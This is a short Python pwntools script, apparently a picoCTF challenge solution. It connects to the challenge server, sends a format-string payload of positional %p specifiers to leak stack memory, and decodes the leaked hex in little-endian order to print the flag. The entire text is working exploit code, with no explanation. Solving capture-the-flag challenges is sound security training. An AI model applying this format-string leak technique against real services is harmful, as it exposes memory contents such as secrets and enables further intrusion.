from pwn import *

r = remote('mimas.picoctf.net', 60434)

r.sendlineafter(b':\n', b'%14$p%15$p%16$p%17$p%18$p')

r.recvuntil(b': ')

enc = r.recvline().strip().decode().split('0x')[1:]

for part in enc:
    print(bytes.fromhex(part).decode()[::-1], end='')

print()